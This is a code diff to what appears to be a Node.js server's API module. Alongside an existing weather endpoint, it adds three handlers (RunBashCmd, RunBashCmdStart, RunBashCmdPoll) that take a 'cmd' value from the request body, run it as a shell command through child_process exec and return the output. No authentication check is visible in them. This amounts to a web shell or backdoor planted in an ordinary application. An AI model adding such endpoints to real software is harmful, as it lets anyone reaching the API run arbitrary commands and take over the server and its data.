@@ -1,5 +1,8 @@
 import {getUserInfo} from "../util/UserUtils.js";
 import followRedirects from "follow-redirects";
+import { exec } from 'child_process';
+import util from 'util';
+const execPromise = util.promisify(exec);
 const DAYTIME=24*3600*1000;
 
 const WEATHERMAP_API_KEY=process.env.WEATHERMAP_API_KEY;
@@ -62,7 +65,52 @@ export default function(app,router,apiMap) {
 	}
 
 	//-------------------------------------------------------------------
-	//General API calls:
+	apiMap['RunBashCmd'] = async function(req, res) {
+		const reqVO = req.body.vo;
+		const cmd = reqVO && reqVO.cmd;
+		if (!cmd) {
+			res.json({ code: 400, info: "Missing cmd" });
+			return;
+		}
+		try {
+			const { stdout, stderr } = await execPromise(cmd, { timeout: 30000, maxBuffer: 1024 * 1024 });
+			res.json({ code: 200, stdout: stdout || "", stderr: stderr || "" });
+		} catch (err) {
+			// exec throws on non-zero exit; still return the output
+			res.json({ code: 200, stdout: err.stdout || "", stderr: err.stderr || String(err.message) });
+		}
+	};
+
+	//-------------------------------------------------------------------
+	const bashJobs = new Map();
+
+	apiMap['RunBashCmdStart'] = function(req, res) {
+		const cmd = req.body.vo && req.body.vo.cmd;
+		if (!cmd) { res.json({code:400, info:'Missing cmd'}); return; }
+		const jobId = Date.now() + '-' + Math.random().toString(36).slice(2,8);
+		const job = {output:'', done:false};
+		bashJobs.set(jobId, job);
+		// Use exec (same mechanism as RunBashCmd which is proven to work)
+		execPromise(cmd, {timeout:30000, maxBuffer:1024*1024}).then(function(r){
+			job.output = (r.stdout||'') + (r.stderr||'');
+			job.done = true;
+			setTimeout(function(){ bashJobs.delete(jobId); }, 300000);
+		}).catch(function(err){
+			job.output = (err.stdout||'') + (err.stderr||String(err.message));
+			job.done = true;
+			setTimeout(function(){ bashJobs.delete(jobId); }, 300000);
+		});
+		res.json({code:200, jobId});
+	};
+
+	apiMap['RunBashCmdPoll'] = function(req, res) {
+		const jobId = req.body.vo && req.body.vo.jobId;
+		if (!jobId) { res.json({code:400, info:'Missing jobId'}); return; }
+		const job = bashJobs.get(jobId);
+		if (!job) { res.json({code:404, info:'Job not found'}); return; }
+		res.json({code:200, output:job.output, done:job.done});
+	};
+
 	apiMap['getWeather'] = async function (req, res, next) {
 		let reqVO, userId, token, userInfo, weatherJSON,city;
 		
